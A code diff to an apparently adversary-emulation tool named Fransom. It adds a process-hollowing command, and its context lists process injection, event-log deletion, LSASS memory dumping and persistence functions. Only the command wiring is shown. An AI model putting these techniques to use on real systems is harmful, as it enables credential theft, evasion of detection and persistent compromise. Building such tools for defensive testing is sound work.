@@ -61,6 +61,8 @@ namespace Fransom
             public bool APCInjectNewProcess { get; set; }
             [Option("remote-thread", HelpText = "Process injection with CreateRemoteThread. Give PID as parameter", Group = "arguments")]
             public int RemoteThread { get; set; }
+            [Option("process-hollowing", HelpText = "Execute simple Process Hollowing with calc.exe", Group = "arguments")]
+            public bool ProcessHollowing { get; set; }
             [Option("delete-eventlogs", HelpText = "Delete event logs from the local machine.", Group = "arguments")]
             public bool DeleteLogs { get; set; }
             [Option("dump-lsass", HelpText = "Dump LSASS process memory.", Group = "arguments")]
@@ -110,12 +112,13 @@ namespace Fransom
             Logger.WriteLine("apc-inject\t\t\t\tAPC injection into any process. Give PID as parameter");
             Logger.WriteLine("apc-inject-new-process\t\t\tAPC injection into a process (notepad.exe).");
             Logger.WriteLine("remote-thread\t\t\t\tProcess injection with CreateRemoteThread. Give PID as parameter");
+            Logger.WriteLine("process-hollowing\t\t\tExecute simple Process Hollowing with calc.exe");
             Logger.WriteLine("delete-eventlogs\t\t\tDelete event logs from the local machine.");
             Logger.WriteLine("dump-lsass\t\t\t\tDump LSASS process memory.");
             Logger.WriteLine("userregkey\t\t\t\tPersistence via registry run key.");
             Logger.WriteLine("userregkey-clean\t\t\tClear registry peristence.");
             Logger.WriteLine("scheduled-task\t\t\t\tPersistence via new Scheduled Task.");
-            Logger.WriteLine("scheduled-task-clean\t\t\t\tClean Scheduled Task persistence.");
+            Logger.WriteLine("scheduled-task-clean\t\t\tClean Scheduled Task persistence.");
             Logger.WriteLine("ps\t\t\t\t\tList running processes.");
             Logger.WriteLine("domain-users\t\t\t\tList domain users.");
             Logger.WriteLine("domain-groups\t\t\t\tList domain groups.");
@@ -139,7 +142,7 @@ namespace Fransom
             var helpText = HelpText.AutoBuild(result, h =>
             {
                 h.AdditionalNewLineAfterOption = false;
-                h.Heading = FiggleFonts.Doom.Render("FRANSOM v0.6");
+                h.Heading = FiggleFonts.Doom.Render("FRANSOM v0.7");
                 h.Copyright = "Copyright (c) 2021 Fraktal Ltd.";
                 return HelpText.DefaultParsingErrorsHandler(result, h);
             }, e => e);
@@ -221,6 +224,11 @@ namespace Fransom
             {
                 DoRemoteThread(options.RemoteThread);
             }
+            if (options.ProcessHollowing)
+            {
+                var ph = new ProcessHollowing();
+                ph.ExecuteProcessHollowing();
+            }
             if (options.DeleteLogs)
             {
                 foreach (var log in EventLog.GetEventLogs())
@@ -296,8 +304,9 @@ namespace Fransom
             var p = new Persistence();
             var e = new Enumerate();
             var pr = new Program();
+            var ph = new ProcessHollowing();
             Logger.WriteLine("");
-            Logger.WriteLine(FiggleFonts.Doom.Render("FRANSOM v0.6"));
+            Logger.WriteLine(FiggleFonts.Doom.Render("FRANSOM v0.7"));
             Logger.WriteLine("Copyright (c) 2021 Fraktal Ltd.");
             Logger.WriteLine("");
             while (command != "exit")
@@ -396,6 +405,9 @@ namespace Fransom
                         {
                             Logger.WriteLine("The value provided is not a valid process id.");
                         }
+                        break;
+                    case "process-hollowing":
+                        ph.ExecuteProcessHollowing();
                         break;
                     case "delete-eventlogs":
                         pr.DeleteEventLogs();
